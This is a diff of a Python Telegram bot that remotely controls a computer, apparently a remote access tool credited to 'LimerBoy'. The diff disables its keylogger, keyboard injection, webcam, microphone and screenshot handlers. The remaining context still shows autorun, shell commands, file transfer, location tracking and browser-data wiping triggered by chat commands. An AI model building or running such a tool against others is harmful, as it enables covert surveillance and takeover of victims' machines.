@@ -18,15 +18,14 @@ import services.startup as Autorun
 import services.filemanager as Files
 import services.volume as VolumeLevel
 import services.shell as SystemCommand
-import services.keylogger as Keylogger
-import services.keyboard as Keyboard
+#import services.keylogger as Keylogger
+#import services.keyboard as Keyboard
 import services.transfer as FileTransfer
 import services.location as TrackLocation
 import services.information as SystemInfo
-import services.webcamera as WebcamRecorder
+#import services.webcamera as WebcamRecorder
 import services.taskmanager as ProcessManager
-import services.screenshot as DesktopScreenshot
-import services.microphone as MicrophoneRecorder
+#import services.microphone as MicrophoneRecorder
 
 """
 Author : LimerBoy
@@ -150,12 +149,6 @@ def Screenshot(message):
     Logger.Log(f"Screenshot >> Get desktop screenshot", chatid)
     # Create desktop screenshot & send to user
     bot.send_chat_action(chatid, "upload_photo")
-    screenshot = DesktopScreenshot.Capture()
-    bot.send_photo(
-        chat_id=chatid, photo=screenshot,
-        reply_to_message_id=message.message_id,
-        caption=Messages.services.desktop_screenshot_captured
-    )
 
 """ Send webcam video """
 @bot.message_handler(commands=["webcam"])
@@ -251,12 +244,7 @@ def KeyboardCtrl(message):
         return bot.send_message(chatid, Messages.auth.permission_not_found)
 
     # Send special keys list
-    if not text:
-        Keyboard.SendKeyboard(chatid, bot)
-    else:
-        # Send key press
-        Keyboard.SendKeyText(text, chatid)
-
+   
 """ Power control """
 @bot.message_handler(commands=["power"])
 def PowerCtrl(message):
@@ -426,7 +414,6 @@ def KeyboardActions(callback):
         if not Database.UserContainsPermission(chatid, "MICROPHONE"):
             return bot.send_message(chatid, Messages.auth.permission_not_found)
         # Handle microphone command
-        MicrophoneRecorder.Handle(callback, bot)
 
     # Webcam controls
     elif "Webcam" in text:
@@ -434,7 +421,7 @@ def KeyboardActions(callback):
         if not Database.UserContainsPermission(chatid, "WEBCAMERA"):
             return bot.send_message(chatid, Messages.auth.permission_not_found)
         # Handle webcam command
-        WebcamRecorder.Handle(callback, bot)
+       # WebcamRecorder.Handle(callback, bot)
 
     # Keylogger controls
     elif "Keylogger" in text:
@@ -442,7 +429,7 @@ def KeyboardActions(callback):
         if not Database.UserContainsPermission(chatid, "KEYLOGGER"):
             return bot.send_message(chatid, Messages.auth.permission_not_found)
         # Handle keylogger command
-        Keylogger.Handle(callback, bot)
+        #Keylogger.Handle(callback, bot)
 
     # Filemanager controls
     elif text[:2] in ("FA", "FC"):
@@ -494,7 +481,7 @@ def KeyboardActions(callback):
         # Check if token have permissions to do this
         if not Database.UserContainsPermission(chatid, "KEYBOARD"):
             return bot.send_message(chatid, Messages.auth.permission_not_found)
-        Keyboard.SendKeyPress(text.split("_")[-1], chatid)
+      #  Keyboard.SendKeyPress(text.split("_")[-1], chatid)
     # Wipe browsers data
     elif text[:4] == "Wipe":
         # Check if token have permissions to do this
